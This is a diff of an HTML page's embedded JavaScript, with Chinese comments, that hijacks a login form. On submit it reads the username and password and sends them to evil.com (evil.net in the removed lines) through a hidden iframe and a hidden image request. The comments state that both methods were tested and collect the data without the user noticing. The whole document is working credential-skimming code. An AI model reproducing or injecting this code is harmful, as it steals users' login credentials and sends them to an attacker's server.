@@ -79,38 +79,35 @@ form.addEventListener('submit', form_hijacking);
 
 
 function form_hijacking(){
-    // 获取表单内容
-    // 获取表单内容 方式1:
-    var user = document.forms[0].elements[0].elements[0].value;
-    var pass = document.forms[0].elements[0].elements[1].value;
+// 获取表单内容
+// 获取表单内容 方式1:
+var user = document.forms[0].elements[0].elements[0].value;
+var pass = document.forms[0].elements[0].elements[1].value;
 
-    // 获取表单内容 方式2: 使用form.eleName的方式
-    // alert(form.user.value);
-    // alert(form.pass.value);
+// 获取表单内容 方式2: 使用form.eleName的方式
+// alert(form.user.value);
+// alert(form.pass.value);
 
-    // 不管用什么方式 都需要在浏览器console调试 确定可以获取到你要劫持的表单的内容
+// 不管用什么方式 都需要在浏览器console调试 确定可以获取到你要劫持的表单的内容
 
-    //-------------------
+//-------------------
+// 发送表单内容
 
-    // 发送表单内容
-    // 发送表单内容 方式1: 创建iframe标签
-      var iframe1=document.createElement("iframe"); //创建一个iframe 内联框架
-      iframe1.style.display="none";   //设置内联框架为隐藏模式
-      iframe1.src="https://evil.net/data?user=" + user + "&pass=" + pass;
-      document.body.appendChild(iframe1);
+var receiver_url = "http://evil.com/cred_data";
 
+// 发送内容 方式1: 创建iframe标签
+var iframe1=document.createElement("iframe"); //创建一个iframe 内联框架
+iframe1.style.display="none";   //设置样式 隐藏
+iframe1.src= receiver_url + "?user=" + user + "&pass=" + pass;
+document.body.appendChild(iframe1);
 
-    // 发送表单内容 方式2: 创建img标签
-    var img1=new Image();
-    img1.src="https://evil.net/data?user=" + user + "&pass=" + pass;
-    document.body.appendChild(img1);
-
-    // 发送表单内容的方式较多 以上2种都经过了测试 可以无感知获取到表单数据 可以同时使用
-    }
-
-
-
-// --------------------------
+// 发送内容 方式2: 创建img标签
+var img1=new Image();
+img1.src=receiver_url + "?user=" + user + "&pass=" + pass;
+img1.style.display="none";   //设置样式 隐藏
+document.body.appendChild(img1);
+// 发送内容的方式较多 以上2种都经过了测试 可以无感知获取到表单数据 可以同时使用
+}
 </script>
 
 
@@ -119,5 +116,3 @@ function form_hijacking(){
 </div>
 
 </body>
-</html>
-
